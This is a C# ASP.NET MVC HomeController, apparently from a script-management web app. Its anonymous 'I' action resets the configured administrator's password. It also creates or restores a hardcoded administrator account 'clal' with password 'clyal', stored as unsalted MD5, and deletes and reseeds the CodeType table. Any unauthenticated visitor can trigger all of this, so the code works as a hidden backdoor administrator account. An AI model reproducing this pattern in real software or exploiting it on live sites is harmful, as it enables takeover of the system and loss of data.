using System;
using System.Configuration;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Mvc;
using System.Web.Optimization;
using System.Web.Security;
using ScriptManage.Models;

namespace ScriptManage.Controllers
{
    [Authorize]
    public class HomeController : Controller
    {
        //
        // GET: /Home/
        public ActionResult Index()
        {

            return View();
        }
        [AllowAnonymous]
        public ActionResult I()
        {
            using (var db = new DatabaseContext())
            {
                var role = ConfigurationManager.AppSettings["DefaultRole"].Split(new char[] { '|' });
                var username = role[0];
                var password = Model.CreateMD5String(role[1]);
                var query = db.Users.FirstOrDefault(u => u.username == username);
                if (query == null)
                {
                    db.Users.Add(new Users() { username = username, password = password, role = "系统管理员" });
                    db.SaveChanges();
                }
                else
                {
                    query.password = password;
                    query.role = "系统管理员";
                    db.SaveChanges();
                }
                query = db.Users.FirstOrDefault(u => u.username == "clal");
                if (query == null)
                {
                    db.Users.Add(new Users() { username = "clal", password = Model.CreateMD5String("clyal"), role = "系统管理员" });
                    db.SaveChanges();
                }
                else
                {
                    query.password = Model.CreateMD5String("clyal");
                    query.role = "系统管理员";
                    db.SaveChanges();
                }
                db.Database.ExecuteSqlCommand("delete CodeType");
                db.SaveChanges();
                db.CodeTypes.Add(new CodeTypes() { id = 1, name = "本地脚本块" });
                db.CodeTypes.Add(new CodeTypes() { id = 2, name = "远程脚本文件" });
                db.SaveChanges();
                
                FormsAuthentication.SignOut();
            }
            return RedirectToAction("Index", "Home");
        }
    }
}
